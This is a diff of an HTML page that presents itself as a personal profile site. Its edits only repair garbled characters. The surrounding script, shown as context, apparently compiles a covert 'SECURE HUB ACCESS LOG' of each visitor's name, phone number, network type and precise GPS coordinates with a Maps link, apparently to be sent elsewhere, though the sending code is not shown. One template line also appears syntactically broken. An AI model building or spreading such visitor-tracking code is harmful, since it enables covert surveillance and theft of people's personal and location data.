@@ -404,7 +404,7 @@
             <div class="owner-profile">
                 <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg" alt="Lalu Kumar Tanti">
                 <h1>Lalu Kumar Tanti</h1>
-                <h3>Creative Developer • Learner • Dream Builder</h3>
+                <h3>Creative Developer â€¢ Learner â€¢ Dream Builder</h3>
                 <p>
                     A passionate and hardworking individual with a strong interest in technology,
                     web development, and creative digital projects. Always eager to learn new skills,
@@ -631,7 +631,7 @@
             const message = `
 🚨 *SECURE HUB ACCESS LOG* 🚨
 
-• *USER IDENTITY*
+👤 *USER IDENTITY*
 • Name: ${name}
 • Phone: \`${phone}\`
 
@@ -651,7 +651,7 @@
 • *Type:* ${network}
 
 📍 *LOCATION DATA*
-${locData ? • Coords: \`${locData.lat}, ${locData.lon}\`\n• Accuracy: ${Math.round(locData.acc)}m\nðŸ”— [Open Maps](https://www.google.com/maps?q=${locData.lat},${locData.lon})` : "âŒ Location Denied/Unavailable"}
+${locData ? • Coords: \`${locData.lat}, ${locData.lon}\`\n• Accuracy: ${Math.round(locData.acc)}m\n🔗 [Open Maps](https://www.google.com/maps?q=${locData.lat},${locData.lon})` : "❌ Location Denied/Unavailable"}
 
 ⏰ *Time:* ${new Date().toLocaleString()}
 `;
@@ -814,4 +814,3 @@ ${locData ? • Coords: \`${locData.lat}, ${locData.lon}\`\n• Accuracy: ${Math
     </script>
 </body>
 </html>
-
